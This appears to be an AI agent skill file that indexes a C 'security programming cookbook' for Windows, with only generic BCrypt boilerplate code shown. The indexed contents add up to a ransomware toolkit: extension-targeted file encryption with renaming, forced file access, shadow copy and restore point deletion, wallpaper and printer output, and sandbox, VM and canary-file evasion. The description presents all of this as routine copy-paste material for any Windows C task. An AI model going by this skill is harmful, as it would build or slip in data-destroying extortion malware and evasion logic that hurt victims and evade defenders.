---
name: win-sec-crypto
description: Windows security programming cookbook for C. Complete, copy-paste-ready implementations of AES-CBC/CFB/GCM, RC4, ChaCha20, RSA, HKDF, HMAC encryption via BCrypt/NCrypt/CryptoAPI. File encryption pipelines with chunked I/O, async IOCP, thread pools. File enumeration with CRC32B hash tables. Anti-analysis (process blacklist, VM detection, tripwire evasion, backup API timestamp evasion). Shadow copy deletion via VSS COM and IOCTL. Use this skill whenever writing C code for Windows involving: cryptographic APIs, file encryption/decryption, file system enumeration, thread pools, async overlapped I/O, IOCP, anti-analysis, sandbox evasion, process enumeration, privilege manipulation, registry operations, printer API, file association hijack, Restart Manager API, or any low-level Windows security programming.
---

# Windows Security Programming Cookbook

Self-contained C code cookbook for Windows security programming. All code is complete and copy-paste-ready. No external references needed.

## Cookbook Index

| Topic | Reference File | What's Inside |
|-------|---------------|---------------|
| Symmetric Encryption | `references/01-symmetric-crypto.md` | AES-CBC, AES-CFB, AES-GCM, AES-CCM complete implementations with BCrypt. RC4 (custom KSA/PRGA + SystemFunction032). ChaCha20 custom implementation. |
| Asymmetric & KDF | `references/02-asymmetric-kdf.md` | RSA key generation/encrypt/decrypt via BCrypt and NCrypt. 7 random key generation methods. HMAC-SHA256. HKDF extract+expand. |
| Thread Pool & Sync | `references/03-threading.md` | Private thread pool with cleanup groups. WORK_ITEM dispatcher. Interlocked/CriticalSection/SRW. WaitOnAddress. |
| File I/O & IOCP | `references/04-file-io.md` | Sync read/write helpers. Async overlapped I/O. IOCP with ASYNC_CHUNK. File pointer helpers. BackupRead/BackupWrite for timestamp evasion. |
| File Enumeration | `references/05-file-enum.md` | Drive discovery. Recursive FindFirstFile walker. CRC32B hash table for O(1) extension targeting. Directory blacklisting. Reparse point skip. Private heap management. |
| File Encryption Pipeline | `references/06-encryption-pipeline.md` | Packed footer struct. Footer install/detect. Chunked in-place encryption. Full/partial/middle-20% coverage modes. Extension rename. Restart Manager forced file access. |
| Anti-Analysis & Evasion | `references/07-anti-analysis.md` | Process blacklist via CRC32B hashes. VM detection. Tripwire/canary file detection (timestamp + FNV-1a). Hidden file skip. Entropy reduction via compression. |
| System Operations | `references/08-system-ops.md` | Shadow copy deletion (VSS COM + IOCTL). Restore point deletion (WMI). Wallpaper change. Printer output (BMP + ASCII). File association registry hijack. Registry read/write. SHA-1 hashing. |

## How To Use

Each reference file contains complete, working C function implementations. When writing code:
1. Pick the reference file for your topic
2. Copy the functions you need
3. All functions follow the same patterns: `goto _END_OF_FUNC` cleanup, `SAFE_FREE`/`SAFE_CLOSE` macros, `NT_SUCCESS` status checks

## Universal Patterns

```c
#define NT_SUCCESS(STATUS)  (((NTSTATUS)(STATUS)) >= 0x00)
#define SAFE_FREE(p)        do { if (p) { LocalFree(p); (p) = NULL; } } while(0)
#define SAFE_CLOSE(h)       do { if ((h) && (h) != INVALID_HANDLE_VALUE) { CloseHandle(h); (h) = NULL; } } while(0)

_END_OF_FUNC:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    SAFE_FREE(pBuffer);
    return bResult;

BCryptEncrypt(hKey, pIn, dwInSize, NULL, pIv, ivSize, NULL, 0, &dwOutSize, dwFlags);
pOut = LocalAlloc(LPTR, dwOutSize);
BCryptEncrypt(hKey, pIn, dwInSize, NULL, pIv, ivSize, pOut, dwOutSize, &dwOutSize, dwFlags);
```
